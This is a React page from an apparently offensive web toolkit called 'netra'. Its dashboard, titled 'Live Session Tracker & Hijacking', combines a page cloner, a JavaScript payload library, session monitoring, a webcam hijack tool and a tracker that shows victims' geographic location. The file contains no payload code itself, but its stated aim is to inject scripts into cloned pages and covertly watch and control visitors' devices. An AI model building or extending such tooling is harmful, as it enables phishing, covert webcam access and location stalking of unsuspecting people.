
'use client';

import { useState, useEffect } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';
import { WebcamHijackTool } from '@/components/webcam-hijack-tool';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { LocationTracker } from '@/components/location-tracker';

export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [location, setLocation] = useState<{lat: number, lon: number} | null>(null);

  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }
  
  // Convert Record to Map for components that expect it
  const sessionsMap = new Map(Object.entries(sessions));

  const setSessionsFromMap = (newMap: Map<string, TrackedEvent[]>) => {
    setSessions(Object.fromEntries(newMap.entries()));
  };

  useEffect(() => {
    if (selectedSessionId) {
      const lastLocationEvent = sessions[selectedSessionId]?.slice().reverse().find(e => e.type === 'location' && e.data.latitude);
      if (lastLocationEvent) {
        setLocation({ lat: lastLocationEvent.data.latitude, lon: lastLocationEvent.data.longitude });
      } else {
        setLocation(null);
      }
    } else {
        setLocation(null);
    }
  }, [selectedSessionId, sessions]);


  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>

      <AdvancedPageCloner selectedPayload={selectedPayload}/>
      <Separator className="my-4" />
      <LiveTracker 
        sessions={sessionsMap}
        setSessions={setSessionsFromMap}
        selectedSessionId={selectedSessionId}
        setSelectedSessionId={setSelectedSessionId}
      />
      <Separator className="my-4" />
      <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
      <Separator className="my-4" />
      <WebcamHijackTool 
        sessions={sessionsMap} 
        selectedSessionId={selectedSessionId}
        setSelectedSessionId={setSelectedSessionId}
      />
      <Separator className="my-4" />
      <LocationTracker location={location} />
    </div>
  );
}
